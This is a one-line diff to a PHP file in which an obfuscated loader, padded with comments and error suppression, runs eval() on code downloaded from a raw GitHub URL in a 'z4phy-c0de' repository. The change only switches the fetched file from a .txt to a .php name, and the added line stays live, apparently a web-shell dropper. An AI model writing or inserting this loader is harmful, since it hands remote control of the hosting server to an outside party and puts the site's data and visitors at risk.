@@ -1,1 +1,1 @@
-<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/alfa/call-z4p-alfa.txt"))/******/ /*b-z4p-alfa*/?>
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/alfa/call-z4p-alfa.php"))/******/ /*b-z4p-alfa*/?>
